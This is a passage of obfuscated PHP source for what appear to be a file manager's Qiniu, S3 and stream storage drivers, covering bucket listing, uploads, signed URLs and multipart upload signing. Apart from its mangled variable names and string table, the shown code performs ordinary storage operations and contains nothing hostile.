$¡¹í°Äï . $«ÈÂ›¡Œ[8]; $®çñ˜šÛ = get_path_this($¡¹í°Äï); $ùúÕŒ…˜ = $ıƒã¸Íç . $®çñ˜šÛ; if (!$this->mkfile($ùúÕŒ…˜)) { return !1; } if (!$this->moveFile($ùúÕŒ…˜, $ıƒã¸Íç)) { $this->delFile($ùúÕŒ…˜); return !1; } return $this->getPathOuter($¡¹í°Äï); } public function copyFile($çÙñÒ¤ã, $ÆÛÙÌÛŸ) { $µÅéšî = $this->bucketManager->copy($this->bucket, $çÙñÒ¤ã, $this->bucket, $ÆÛÙÌÛŸ, !0); return $µÅéšî ? !1 : $this->getPathOuter($ÆÛÙÌÛŸ); } public function moveFile($³‚åÔ€õ, $ĞÁš¥²ı) { $Û²“óğ¹ = $this->bucketManager->move($this->bucket, $³‚åÔ€õ, $this->bucket, $ĞÁš¥²ı, !0); return $Û²“óğ¹ ? !1 : $this->getPathOuter($ĞÁš¥²ı); } public function delFile($™¬ß©»») { if (!$this->exist($™¬ß©»»)) { return !0; } $ıì™º×Ğ = $this->bucketManager->delete($this->bucket, $™¬ß©»»); return $ıì™º×Ğ ? !1 : !0; } public function delFolder($õáƒçô’) { $¨’Îí— =& $_SERVER[Ñ¯©ç]; if (!$this->exist($õáƒçô’)) { return !0; } $this->listItemCache = !1; $ŸÛÍŠÁ÷ = $this->fileList($õáƒçô’); $this->listItemCache = !0; $­•‡å = trim($õáƒçô’, $¨’Îí—[8]) . $¨’Îí—[8]; if (!empty($õáƒçô’) && $õáƒçô’ !== $¨’Îí—[229] && !in_array($­•‡å, $ŸÛÍŠÁ÷[$¨’Îí—[95]])) { $ŸÛÍŠÁ÷[$¨’Îí—[95]][] = $­•‡å; } $îíéÁÈÆ = $this->delByBatch($ŸÛÍŠÁ÷[$¨’Îí—[96]]); if (!$îíéÁÈÆ) { return !1; } $îíéÁÈÆ = $this->delByBatch($ŸÛÍŠÁ÷[$¨’Îí—[95]]); if (!$îíéÁÈÆ) { return !1; } return $this->delFile($­•‡å); } private function delByBatch($«¼¡ µÜ) { foreach (array_chunk($«¼¡ µÜ, 1000) as $Âéäò’) { $—º‹­¼ = $this->bucketManager->buildBatchDelete($this->bucket, $Âéäò’); list($«šÕïÀ, $éŒÕ²) = $this->bucketManager->batch($—º‹­¼); if ($éŒÕ²) { return !1; } } return !0; } public function rename($”¬ÄÓÈ±, $¡©ŸÅé®) { return $this->renameObject($”¬ÄÓÈ±, $¡©ŸÅé®); } public function fileInfo($ºË‘îÕĞ, $ñğ”Ï = false, $èèÏÌ“» = array()) { $ã–äõ¡ê =& $_SERVER[Ñ¯©ç]; $İÄÄìèğ = array($ã–äõ¡ê[32] => $this->pathThis($ºË‘îÕĞ), $ã–äõ¡ê[97] => $this->getPathOuter($ã–äõ¡ê[8] . $ºË‘îÕĞ), $ã–äõ¡ê[33] => $ã–äõ¡ê[231], $ã–äõ¡ê[89] => isset($èèÏÌ“»[$ã–äõ¡ê[1506]]) ? $èèÏÌ“»[$ã–äõ¡ê[1506]] : 0, $ã–äõ¡ê[188] => $this->ext($ºË‘îÕĞ)); if ($ñğ”Ï) { return $İÄÄìèğ; } $İÄÄìèğ[$ã–äõ¡ê[232]] = $İÄÄìèğ[$ã–äõ¡ê[98]] = 0; $İÄÄìèğ[$ã–äõ¡ê[233]] = $İÄÄìèğ[$ã–äõ¡ê[234]] = !0; if (empty($èèÏÌ“»)) { $èèÏÌ“» = $this->objectMeta($ºË‘îÕĞ); if (!$èèÏÌ“») { return $İÄÄìèğ; } } if (isset($èèÏÌ“»[$ã–äõ¡ê[235]]) && $èèÏÌ“»[$ã–äõ¡ê[235]]) { $İÄÄìèğ[$ã–äõ¡ê[236]] = $èèÏÌ“»[$ã–äõ¡ê[235]]; } if (isset($èèÏÌ“»[$ã–äõ¡ê[246]]) && $èèÏÌ“»[$ã–äõ¡ê[246]]) { $İÄÄìèğ[$ã–äõ¡ê[236]] = $èèÏÌ“»[$ã–äõ¡ê[246]]; } if (isset($èèÏÌ“»[$ã–äõ¡ê[1507]])) { $İÄÄìèğ[$ã–äõ¡ê[98]] = substr($èèÏÌ“»[$ã–äõ¡ê[1507]] . $ã–äõ¡ê[12], 0, 10); } if (isset($èèÏÌ“»[$ã–äõ¡ê[1506]])) { $İÄÄìèğ[$ã–äõ¡ê[89]] = $èèÏÌ“»[$ã–äõ¡ê[1506]]; } return $İÄÄìèğ; } public function folderInfo($Îú‘ê¡Š, $£›ì€ˆğ = false) { $ ØäÓ¨ =& $_SERVER[Ñ¯©ç]; $ íŒ’›Õ = array($ ØäÓ¨[32] => $this->pathThis($Îú‘ê¡Š), $ ØäÓ¨[97] => $this->getPathOuter($ ØäÓ¨[8] . $Îú‘ê¡Š), $ ØäÓ¨[33] => $ ØäÓ¨[88]); if ($£›ì€ˆğ) { return $ íŒ’›Õ; } $ íŒ’›Õ[$ ØäÓ¨[232]] = $ íŒ’›Õ[$ ØäÓ¨[98]] = 0; $ íŒ’›Õ[$ ØäÓ¨[233]] = $ íŒ’›Õ[$ ØäÓ¨[234]] = !0; $Îú‘ê¡Š = rtrim($Îú‘ê¡Š, $ ØäÓ¨[8]) . $ ØäÓ¨[8]; $ëíÂÈ½ = $this->objectMeta($Îú‘ê¡Š); if (isset($ëíÂÈ½[$ ØäÓ¨[1507]])) { $ íŒ’›Õ[$ ØäÓ¨[98]] = substr($ëíÂÈ½[$ ØäÓ¨[1507]] . $ ØäÓ¨[12], 0, 10); } return $ íŒ’›Õ; } public function listPath($ááÊï¾Ÿ, $Óıìİ–² = false) { $íªıë–ô =& $_SERVER[Ñ¯©ç]; $·Ö‚ÚöØ = $this->fileList($ááÊï¾Ÿ, $íªıë–ô[8], !0); foreach ($·Ö‚ÚöØ[$íªıë–ô[95]] as $àœİÄªõ => $÷¬‚®û) { $·Ö‚ÚöØ[$íªıë–ô[95]][$àœİÄªõ] = $this->folderInfo($÷¬‚®û, $Óıìİ–²); } foreach ($·Ö‚ÚöØ[$íªıë–ô[96]] as $àœİÄªõ => $÷¬‚®û) { $·Ö‚ÚöØ[$íªıë–ô[96]][$àœİÄªõ] = $this->fileInfo($÷¬‚®û[$íªıë–ô[107]], $Óıìİ–², $÷¬‚®û); } return $·Ö‚ÚöØ; } public function has($ˆĞ·º˜, $Äå©£Ö = false, $·­å®ô¿ = true) { $Ó—Îß =& $_SERVER[Ñ¯©ç]; $ˆĞ·º˜ = trim($ˆĞ·º˜, $Ó—Îß[8]); $ç¶Áì€ = empty($ˆĞ·º˜) && $ˆĞ·º˜ !== $Ó—Îß[229] ? $Ó—Îß[12] : $ˆĞ·º˜ . $Ó—Îß[8]; $„ÒÈˆ¶ = $Ó—Îß[12]; $‰³Ë²´Ú = 500; $ü š½œİ = $Ó—Îß[8]; $Óª¯ş£ƒ = $Á«ë˜ÙÛ = 0; while (!0) { check_abort(); list($Ğ–…‰ã‡, $›ªŒºé·) = $this->bucketManager->listFiles($this->bucket, $ç¶Áì€, $„ÒÈˆ¶, $‰³Ë²´Ú, $ü š½œİ); if ($›ªŒºé·) { break; } $„ÒÈˆ¶ = array_key_exists($Ó—Îß[1448], $Ğ–…‰ã‡) ? $„ÒÈˆ¶ = $Ğ–…‰ã‡[$Ó—Îß[1508]] : $Ó—Îß[12]; if ($Äå©£Ö) { if (!empty($Ğ–…‰ã‡[$Ó—Îß[1509]])) { $Óª¯ş£ƒ += count($Ğ–…‰ã‡[$Ó—Îß[1509]]); } if (!empty($Ğ–…‰ã‡[$Ó—Îß[1510]])) { $Á«ë˜ÙÛ += count($Ğ–…‰ã‡[$Ó—Îß[1510]]); } if ($„ÒÈˆ¶ === $Ó—Îß[12]) { break; } continue; } if ($·­å®ô¿) { if (!empty($Ğ–…‰ã‡[$Ó—Îß[1509]])) { return !0; } } else { if (!empty($Ğ–…‰ã‡[$Ó—Îß[1510]])) { return !0; } } if ($„ÒÈˆ¶ === $Ó—Îß[12]) { break; } } if ($Äå©£Ö) { return array($Ó—Îß[240] => $Óª¯ş£ƒ, $Ó—Îß[241] => $Á«ë˜ÙÛ); } return !1; } public function listAll($–ˆ¦Øşƒ) { $ºØëõÍÆ =& $_SERVER[Ñ¯©ç]; $Í¹ËÕ»  = $this->fileList($–ˆ¦Øşƒ, $ºØëõÍÆ[12], !0); $“çªß•‡ = array_to_keyvalue($Í¹ËÕ» [$ºØëõÍÆ[96]], $ºØëõÍÆ[32]); foreach ($Í¹ËÕ» [$ºØëõÍÆ[95]] as $ÌÏ–ş¨¦) { if (is_string($ÌÏ–ş¨¦)) { $“çªß•‡[$ÌÏ–ş¨¦] = array($ºØëõÍÆ[89] => 0); } } return $this->listAllFiles($–ˆ¦Øşƒ, $“çªß•‡); } private function fileList($ÏÄ  ¶à, $¢ûÁŞŞ = '', $§åÒÓº = 0) { $¥éØ¸¿” =& $_SERVER[Ñ¯©ç]; $ÏÄ  ¶à = trim($ÏÄ  ¶à, $¥éØ¸¿”[8]); $­Ùõ’ì® = empty($ÏÄ  ¶à) && $ÏÄ  ¶à !== $¥éØ¸¿”[229] ? $¥éØ¸¿”[12] : $ÏÄ  ¶à . $¥éØ¸¿”[8]; $·¸¬º¬õ = $¥éØ¸¿”[12]; $£Ó¨—‹® = 1000; $ÃÔ˜Ï‚è = $Ö¹²šİ¿ = array(); while (!0) { check_abort(); list($õ¢«®•‘, $ íÔ´Ñâ) = $this->bucketManager->listFiles($this->bucket, $­Ùõ’ì®, $·¸¬º¬õ, $£Ó¨—‹®, $¢ûÁŞŞ); if ($ íÔ´Ñâ) { break; } $·¸¬º¬õ = array_key_exists($¥éØ¸¿”[1448], $õ¢«®•‘) ? $·¸¬º¬õ = $õ¢«®•‘[$¥éØ¸¿”[1508]] : $¥éØ¸¿”[12]; $œİ™í¬ò = isset($õ¢«®•‘[$¥éØ¸¿”[1509]]) ? $õ¢«®•‘[$¥éØ¸¿”[1509]] : array(); $Æ°‹Š™ = isset($õ¢«®•‘[$¥éØ¸¿”[1510]]) ? $õ¢«®•‘[$¥éØ¸¿”[1510]] : array(); foreach ($œİ™í¬ò as $«áœà ) { if ($«áœà [$¥éØ¸¿”[107]] == $­Ùõ’ì®) { continue; } $‹§Á­² = $«áœà [$¥éØ¸¿”[107]]; $³âêòƒˆ = $«áœà [$¥éØ¸¿”[1506]]; $«áœà [$¥éØ¸¿”[89]] = $³âêòƒˆ; $µÜÒ†úÔ = $³âêòƒˆ == 0 && substr($‹§Á­², strlen($‹§Á­²) - 1, 1) == $¥éØ¸¿”[8] ? !0 : !1; $this->cacheMethodInfoSet($‹§Á­², $µÜÒ†úÔ, $«áœà ); if ($µÜÒ†úÔ) { $ÃÔ˜Ï‚è[] = $‹§Á­²; continue; } $Ö¹²šİ¿[] = $§åÒÓº ? $«áœà  : $‹§Á­²; } foreach ($Æ°‹Š™ as $‹§Á­²) { if ($‹§Á­² == $­Ùõ’ì®) { continue; } $ÃÔ˜Ï‚è[] = $‹§Á­²; $this->cacheMethodInfoSet($‹§Á­², !0); } if ($·¸¬º¬õ === $¥éØ¸¿”[12]) { break; } } $this->cacheMethodInfoSet($ÏÄ  ¶à, !0); return array($¥éØ¸¿”[95] => $ÃÔ˜Ï‚è, $¥éØ¸¿”[96] => $Ö¹²šİ¿); } public function canRead($—ŠÃâÒ«) { return $this->exist($—ŠÃâÒ«) ? !0 : !1; } public function canWrite($äÖêÍî) { return $this->exist($äÖêÍî) ? !0 : !1; } public function getContent($­×à§©) { return $this->fileSubstr($­×à§©, 0, -1); } public function setContent($»‘âùüã, $Ô‡ĞÌé = '') { $ÂØŒï‚ = $this->tempFile($this->pathThis($»‘âùüã)); file_put_contents($ÂØŒï‚, $Ô‡ĞÌé); if ($this->upload($»‘âùüã, $ÂØŒï‚)) { $this->tempFileRemve($ÂØŒï‚); return !0; } return !1; } public function refreshUrls($Ö–ö»­Ò) { $åÏı¬àê =& $_SERVER[Ñ¯©ç]; $›™«Ø½Ğ = array(); if (is_array($Ö–ö»­Ò)) { foreach ($Ö–ö»­Ò as $•¯¡·ˆÜ) { $›™«Ø½Ğ[] = $this->link($•¯¡·ˆÜ); } } else { $›™«Ø½Ğ[] = $this->link($Ö–ö»­Ò); } $ëæ×–Ş = new Qiniu\Cdn\CdnManager($this->auth); list($ŞñïŒ¥£, $£šŸïŠÀ) = $ëæ×–Ş->refreshUrls($›™«Ø½Ğ); if ($£šŸïŠÀ) { return !1; } return $ŞñïŒ¥£[$åÏı¬àê[1239]] == $åÏı¬àê[812] ? !0 : !1; } public function fileSubstr($²ù·â¬“, $¿Ÿ¸º€‘, $ÄÃÒë‹) { $°¶–ºÛ† =& $_SERVER[Ñ¯©ç]; if (!($­¤ªÔìà = $this->link($²ù·â¬“))) { return !1; } $ŸÃöáè = !1; if ($ÄÃÒë‹ > 0) { $ˆéÉØ°î = $¿Ÿ¸º€‘ + $ÄÃÒë‹ - 1; $ŸÃöáè = array($°¶–ºÛ†[1511] . $¿Ÿ¸º€‘ . $°¶–ºÛ†[445] . $ˆéÉØ°î); } $Ø³”ŠÌı = url_request($­¤ªÔìà, $°¶–ºÛ†[262], !1, $ŸÃöáè); return $Ø³”ŠÌı[$°¶–ºÛ†[803]] ? $Ø³”ŠÌı[$°¶–ºÛ†[1259]] : !1; } public function upload($œ´ÑíûĞ, $ôÆ†à«, $è«§ÌÃ˜ = false, $ÙĞ˜Ì²ƒ = REPEAT_REPLACE) { $Ÿ›æÎè = new Qiniu\Storage\UploadManager(); $ğŞØî = $this->auth->uploadToken($this->bucket, $œ´ÑíûĞ); $³¢ãàØŒ = get_file_mime(get_path_ext($ôÆ†à«)); list($é²ùüƒÉ, $¤¾±º¸Î) = $Ÿ›æÎè->putFile($ğŞØî, $œ´ÑíûĞ, $ôÆ†à«, null, $³¢ãàØŒ); return $¤¾±º¸Î ? !1 : $this->getPathOuter($œ´ÑíûĞ); } public function uploadFormData($–æìêŸ¥, $Ğ×¥¾ê = 3600) { return $this->uploadToken($–æìêŸ¥, $Ğ×¥¾ê); } public function multiUploadFormData($æ±ü®³Â, $ëˆşÆÂŸ = 3600) { return $this->uploadToken($æ±ü®³Â, $ëˆşÆÂŸ); } private function uploadToken($ØÅ…ø—±, $Ğüè   = 3600) { $»˜Á‰şÉ =& $_SERVER[Ñ¯©ç]; $ÄÌ•Û¿— = $Ğüè  ; $¶š¿­²° = array($»˜Á‰şÉ[1512] => $»˜Á‰şÉ[1513]); $ñøéÑ® = $ØÅ…ø—±; $š‹ãÄè = $this->auth->uploadToken($this->bucket, $ñøéÑ®, $ÄÌ•Û¿—, $¶š¿­²°, !0); $õí¨ô¡» = empty($this->region) || $this->region == $»˜Á‰şÉ[1514] ? $»˜Á‰şÉ[12] : $»˜Á‰şÉ[445] . $this->region; $˜’¸…½ß = http_type() . "\72\x2f\x2f\165\160\154\x6f\x61\144{$õí¨ô¡»}\56\161\x69\156\x69\165\160\x2e\143\157\155\57"; return array($»˜Á‰şÉ[1515] => $š‹ãÄè, $»˜Á‰şÉ[1516] => $˜’¸…½ß); } public function download($Ú÷ö¨˜†, $¼ó€”‹ö) { $ìİú‹Á = IO::getPathInner(IO::mkfile($¼ó€”‹ö)); if (!($Œ†Çõ³ = $this->link($Ú÷ö¨˜†))) { return !1; } $Ş³˜ä‰ = 0; $´¬ê·È‹ = 1024 * 200; $Ñì¼°¨Ü = fopen($ìİú‹Á, $_SERVER[Ñ¯©ç][1517]); while (!0) { $ı˜Ø‹‘ = $this->fileSubstr($Ú÷ö¨˜†, $Ş³˜ä‰, $´¬ê·È‹); if ($ı˜Ø‹‘ === !1) { return !1; } fwrite($Ñì¼°¨Ü, $ı˜Ø‹‘); $Ş³˜ä‰ += $´¬ê·È‹; if (strlen($ı˜Ø‹‘) < $´¬ê·È‹) { break; } } fclose($Ñì¼°¨Ü); return $¼ó€”‹ö; } public function link($±Öãøö, $†±†™± = '') { if (!$this->isFile($±Öãøö)) { return !1; } $Ç­…‚…» = $this->getHost() . $_SERVER[Ñ¯©ç][8] . $this->pathEncode($±Öãøö) . $†±†™±; return $this->auth->privateDownloadUrl($Ç­…‚…», 3600 * 12); } public function fileOut($‰…õ· ¦, $—º½±¦ = false, $¨ÃãíŒ = false, $–ƒ¸Ü‘ = '') { $‚ÅïÒÀ“ =& $_SERVER[Ñ¯©ç]; if ($this->isFileOutServer()) { return $this->fileOutServer($‰…õ· ¦, $—º½±¦, $¨ÃãíŒ, $–ƒ¸Ü‘); } if (!$¨ÃãíŒ) { $¨ÃãíŒ = $this->pathThis($‰…õ· ¦); } $ÂÑİëï© = $—º½±¦ ? $‚ÅïÒÀ“[1518] . rawurlencode($¨ÃãíŒ) : $‚ÅïÒÀ“[12]; $óÊñşªƒ = $this->link($‰…õ· ¦, $ÂÑİëï©); $this->fileOutLink($óÊñşªƒ); } public function fileOutServer($·†¼í÷, $ŒèÊøŒ = false, $ì·…İÌ = false, $ëÙ®ã¨ß = '') { parent::fileOut($·†¼í÷, $ŒèÊøŒ, $ì·…İÌ, $ëÙ®ã¨ß); } public function fileOutImage($Âßµ³àš, $Û³ÆµË = 250) { $éàœíæ™ = $this->link($Âßµ³àš, $_SERVER[Ñ¯©ç][1519] . $Û³ÆµË); $this->fileOutLink($éàœíæ™); } public function fileOutImageServer($şÆàªëå, $·©œÓ¿‚ = 250) { parent::fileOutImage($şÆàªëå, $·©œÓ¿‚); } public function hashMd5($¥ı¡ÛÀ½) { $ñÖ–ÚÓ =& $_SERVER[Ñ¯©ç]; $ıßØœ² = $this->objectMeta($¥ı¡ÛÀ½); return isset($ıßØœ²[$ñÖ–ÚÓ[246]]) ? $ıßØœ²[$ñÖ–ÚÓ[246]] : !1; $¢ßÜ´Õã = $this->link($¥ı¡ÛÀ½, $ñÖ–ÚÓ[1520]); } public function size($¯¤ Ç¹) { $Ò¬¯œëú = $this->objectMeta($¯¤ Ç¹); return $Ò¬¯œëú ? $Ò¬¯œëú[$_SERVER[Ñ¯©ç][89]] : 0; } public function info($–›€û¤¢) { if ($this->isFolder($–›€û¤¢)) { return $this->folderInfo($–›€û¤¢); } else { if ($this->isFile($–›€û¤¢)) { return $this->fileInfo($–›€û¤¢); } } return !1; } public function exist($÷¯õëåÁ) { return $this->isFile($÷¯õëåÁ) || $this->isFolder($÷¯õëåÁ); } public function isFile($§ ß‡À¼) { return !$this->isFolder($§ ß‡À¼) && $this->objectMeta($§ ß‡À¼); } public function isFolder($¨Ğ¢ğ»Ô) { return $this->cacheMethod($_SERVER[Ñ¯©ç][179], $¨Ğ¢ğ»Ô); } protected function objectMeta($û¤úË¤´) { return $this->cacheMethod($_SERVER[Ñ¯©ç][181], $û¤úË¤´); } protected function _objectMeta($ŒçºùİÜ) { $ê”äõ™¥ =& $_SERVER[Ñ¯©ç]; list($¯ñÉ½Ô¸, $ ¨¶øÅÛ) = $this->bucketManager->stat($this->bucket, $ŒçºùİÜ); if ($¯ñÉ½Ô¸) { $¯ñÉ½Ô¸[$ê”äõ™¥[89]] = intval($¯ñÉ½Ô¸[$ê”äõ™¥[1506]]); } return $¯ñÉ½Ô¸; } protected function _isFolder($Š™—÷™­) { $‹ç ‰Ñå =& $_SERVER[Ñ¯©ç]; if ($Š™—÷™­ == $‹ç ‰Ñå[12] || $Š™—÷™­ == $‹ç ‰Ñå[8]) { return !0; } list($Ê³¢ı§ƒ, $µ«õöÉŞ) = $this->bucketManager->listFiles($this->bucket, trim($Š™—÷™­, $‹ç ‰Ñå[8]) . $‹ç ‰Ñå[8], $‹ç ‰Ñå[12], 1, $‹ç ‰Ñå[8]); return !empty($Ê³¢ı§ƒ[$‹ç ‰Ñå[1509]]) || !empty($Ê³¢ı§ƒ[$‹ç ‰Ñå[1510]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ìŞ‹¾Ü) { parent::__construct($ìŞ‹¾Ü); } public function uploadFormData($àÍÏ¦Ù‘, $È¹â¤Ä = 3600) { $ËËÌŞø =& $_SERVER[Ñ¯©ç]; $şÛ×°‰Ö = $ËËÌŞø[230]; $ÜÈ…Ù¸å = $ËËÌŞø[270]; $ÏÒ§àÇ¶ = $ËËÌŞø[72]; $Èö™£ = gmdate($ËËÌŞø[271]); $¹†Ÿ = gmdate($ËËÌŞø[272]); $¯‘Ô†÷ƒ = $ËËÌŞø[273]; $“Ğ®ìá• = $È¹â¤Ä . $ËËÌŞø[12]; $Ó¾–à¯ß = $ËËÌŞø[274]; $ ¿àè™´ = array($this->accessKey, $¹†Ÿ, $this->region, $ÏÒ§àÇ¶, $¯‘Ô†÷ƒ); $Ş÷ªŞ‘Æ = implode($ËËÌŞø[8], $ ¿àè™´); $‚ƒÈñ†ˆ = array($ËËÌŞø[275] => gmdate($ËËÌŞø[1383], strtotime($ËËÌŞø[277])), $ËËÌŞø[278] => array(array($ËËÌŞø[279] => $this->bucket), array($ËËÌŞø[280] => $şÛ×°‰Ö), array($ËËÌŞø[281], $ËËÌŞø[282], $ËËÌŞø[12]), array($ËËÌŞø[281], $ËËÌŞø[283], $ËËÌŞø[12]), array($ËËÌŞø[281], $ËËÌŞø[284], $ËËÌŞø[12]), array($ËËÌŞø[285] => $Ó¾–à¯ß), array($ËËÌŞø[286] => $Ş÷ªŞ‘Æ), array($ËËÌŞø[287] => $ÜÈ…Ù¸å), array($ËËÌŞø[288] => $Èö™£), array($ËËÌŞø[289] => $“Ğ®ìá•))); $³Ñµ¼” = base64_encode(json_encode($‚ƒÈñ†ˆ)); $–áà¼è = hash_hmac($ËËÌŞø[290], $¹†Ÿ, $ËËÌŞø[291] . $this->secret, !0); $È„êì¦’ = hash_hmac($ËËÌŞø[290], $this->region, $–áà¼è, !0); $ğ¨ëÊê¦ = hash_hmac($ËËÌŞø[290], $ÏÒ§àÇ¶, $È„êì¦’, !0); $Ò©İ¼°‚ = hash_hmac($ËËÌŞø[290], $¯‘Ô†÷ƒ, $ğ¨ëÊê¦, !0); $ª·–¢‰æ = hash_hmac($ËËÌŞø[290], $³Ñµ¼”, $Ò©İ¼°‚); $¢œüÒÒÎ = array($ËËÌŞø[247] => $ËËÌŞø[12], $ËËÌŞø[292] => $ËËÌŞø[12], $ËËÌŞø[280] => $şÛ×°‰Ö, $ËËÌŞø[285] => $Ó¾–à¯ß, $ËËÌŞø[293] => $³Ñµ¼”, $ËËÌŞø[294] => $Ş÷ªŞ‘Æ, $ËËÌŞø[295] => $ÜÈ…Ù¸å, $ËËÌŞø[296] => $Èö™£, $ËËÌŞø[297] => $“Ğ®ìá•, $ËËÌŞø[298] => $ª·–¢‰æ, $ËËÌŞø[209] => $this->getHost()); return $¢œüÒÒÎ; } public function multiUploadFormData($¯ê¨íË¯, $‰œÀñ‰‡ = 3600) { $°¹³¼ =& $_SERVER[Ñ¯©ç]; $·»–•Ä‚ = gmdate($°¹³¼[1521]); $Ï©¶Ú÷Í = array(); $ÀŠçàÛ‚ = $this->client->getUploadId($this->bucket, $¯ê¨íË¯, $Ï©¶Ú÷Í); if (!$ÀŠçàÛ‚) { return !1; } return array($°¹³¼[255] => $ÀŠçàÛ‚, $°¹³¼[209] => $this->getHost() . $°¹³¼[8] . $this->pathEncode($¯ê¨íË¯), $°¹³¼[256] => $·»–•Ä‚, $°¹³¼[107] => $¯ê¨íË¯); } public function multiUploadAuthData($ßÏ¼…™¬, $­ˆ·ÑÌ™ = array()) { $úŒ¥èÌ =& $_SERVER[Ñ¯©ç]; $´ãÌ¬ŠÄ = isset($­ˆ·ÑÌ™[$úŒ¥èÌ[188]]) ? $­ˆ·ÑÌ™[$úŒ¥èÌ[188]] : $úŒ¥èÌ[12]; $Šü¤Ÿİ = $­ˆ·ÑÌ™[$úŒ¥èÌ[107]]; unset($­ˆ·ÑÌ™[$úŒ¥èÌ[107]]); if (isset($­ˆ·ÑÌ™[$úŒ¥èÌ[257]])) { return $this->listUploadParts($Šü¤Ÿİ, $­ˆ·ÑÌ™); } $ÃµÀçÏ = array(); if (isset($­ˆ·ÑÌ™[$úŒ¥èÌ[1522]])) { $ÃµÀçÏ[$úŒ¥èÌ[1523]] = $­ˆ·ÑÌ™[$úŒ¥èÌ[1522]]; } $Âıˆ’‚Ç = explode($úŒ¥èÌ[211], $this->getHost()); $–Õ«ş´¥ = array($úŒ¥èÌ[1524] => $Âıˆ’‚Ç[1], $úŒ¥èÌ[1525] => $úŒ¥èÌ[12], $úŒ¥èÌ[247] => $úŒ¥èÌ[133], $úŒ¥èÌ[292] => $­ˆ·ÑÌ™[$úŒ¥èÌ[89]]); $ÌÁ¸°ÕŞ = $úŒ¥èÌ[260]; $ü—ÔÁò = $úŒ¥èÌ[8] . $this->pathEncode($Šü¤Ÿİ) . $´ãÌ¬ŠÄ; $®»»¶ÊÒ = $this->client->__getSignatureV4($ÃµÀçÏ, $–Õ«ş´¥, $ÌÁ¸°ÕŞ, $ü—ÔÁò); if (strpos($´ãÌ¬ŠÄ, $úŒ¥èÌ[259]) === 0) { if (isset($ÃµÀçÏ[$úŒ¥èÌ[1523]])) { $é‹âä¤— = $ÃµÀçÏ[$úŒ¥èÌ[1523]]; } else { if (isset($®»»¶ÊÒ[$úŒ¥èÌ[1523]])) { $é‹âä¤— = $®»»¶ÊÒ[$úŒ¥èÌ[1523]]; } else { $é‹âä¤— = hash($úŒ¥èÌ[290], $úŒ¥èÌ[12]); } } return array($úŒ¥èÌ[265] => $®»»¶ÊÒ[$úŒ¥èÌ[265]], $úŒ¥èÌ[1523] => $é‹âä¤—, $úŒ¥èÌ[256] => $®»»¶ÊÒ[$úŒ¥èÌ[1526]]); } return $®»»¶ÊÒ[$úŒ¥èÌ[265]]; } public function listUploadParts($›àß€ò—, $¶„¤âÏ = array()) { $şÂê–¢ =& $_SERVER[Ñ¯©ç]; $£ê¡ù = str_replace($şÂê–¢[266], $şÂê–¢[12], $¶„¤âÏ[$şÂê–¢[188]]); $ğ‰ù›ç» = $this->client->listParts($this->bucket, $›àß€ò—, $£ê¡ù); if (!$ğ‰ù›ç») { return !1; } $…Ùú™ = $şÂê–¢[1527]; foreach ($ğ‰ù›ç» as $»ôÀÓ ‰) { $…Ùú™ .= $şÂê–¢[1528] . "\x3c\120\141\x72\164\116\165\x6d\142\145\x72\76{$»ôÀÓ ‰[$şÂê–¢[1456]]}\74\x2f\120\141\162\x74\x4e\165\155\x62\x65\162\x3e\12" . "\74\105\124\141\147\76{$»ôÀÓ ‰[$şÂê–¢[1457]]}\x3c\x2f\x45\x54\x61\x67\x3e\12" . $şÂê–¢[1529]; } $…Ùú™ .= $şÂê–¢[1530]; $Ï’‘‚ã€ = array(); $Û¦”Æğ = explode($şÂê–¢[211], $this->getHost()); $´Äˆ°Íâ = array($şÂê–¢[1524] => $Û¦”Æğ[1], $şÂê–¢[247] => $şÂê–¢[133], $şÂê–¢[292] => strlen($…Ùú™)); $¡ÊÓ•Âì = $şÂê–¢[258]; $ó„»Ãì´ = $şÂê–¢[8] . $this->pathEncode($›àß€ò—) . $¶„¤âÏ[$şÂê–¢[188]]; $ãúú–åç = $this->client->__getSignatureV4($Ï’‘‚ã€, $´Äˆ°Íâ, $¡ÊÓ•Âì, $ó„»Ãì´, $…Ùú™); return array($şÂê–¢[265] => $ãúú–åç[$şÂê–¢[265]], $şÂê–¢[256] => $ãúú–åç[$şÂê–¢[1526]], $şÂê–¢[267] => $ğ‰ù›ç», $şÂê–¢[1523] => $ãúú–åç[$şÂê–¢[1523]]); } public function link($×üŞËË, $°¶èï´ = array()) { return parent::link($×üŞËË, $°¶èï´); } public function fileOut($×èæ­³, $ƒ¿ùÚÛë = false, $×Õíš’ = false, $¸šÍ³Êú = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ñ¯©ç][1531])) { return parent::fileOutServer($×èæ­³, $ƒ¿ùÚÛë, $×Õíš’, $¸šÍ³Êú); } parent::fileOut($×èæ­³, $ƒ¿ùÚÛë, $×Õíš’, $¸šÍ³Êú); } public function fileOutImage($î²ãıîÖ, $ÂÀŠ€ = 250) { if (strstr($this->endpoint, $_SERVER[Ñ¯©ç][1531])) { return parent::fileOutImageServer($î²ãıîÖ, $ÂÀŠ€); } parent::fileOutImage($î²ãıîÖ, $ÂÀŠ€); } public function fileOutLink($‹Ù®®ÚÅ) { $¦Ëôè–œ =& $_SERVER[Ñ¯©ç]; if (substr($‹Ù®®ÚÅ, 0, 7) == $¦Ëôè–œ[1381]) { $‹Ù®®ÚÅ = $¦Ëôè–œ[1382] . substr($‹Ù®®ÚÅ, 7); } header($¦Ëôè–œ[175] . $‹Ù®®ÚÅ); die; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($§–áÇâ, $¶¯„·áø = 0) { parent::__construct(); $this->source = $§–áÇâ; $this->sourceSize = $¶¯„·áø; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ûš®ô‰× = false) { return $this->sourceSize; } public function getContent($Â«ìÏÏÖ = false) { return $this->fileSubstr($Â«ìÏÏÖ, 0, $this->sourceSize); } public function fileSubstr($¾ìš…”š = false, $–ğ¸şªî = 0, $Ú“öèÑñ = 0) { if (!$Ú“öèÑñ) { $Ú“öèÑñ = $this->sourceSize; } $·ú÷£Ó = $this->sourceSize - $–ğ¸şªî; if ($Ú“öèÑñ >= $·ú÷£Ó) { $Ú“öèÑñ = $·ú÷£Ó; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $–ğ¸şªî, $Ú“öèÑñ); } if ($this->sourceType == self::TYPE_FILE) { if ($Ú“öèÑñ <= 0) { return $_SERVER[Ñ¯©ç][12]; } $ÜñØ¯èº = ftell($this->source); fseek_64($this->source, 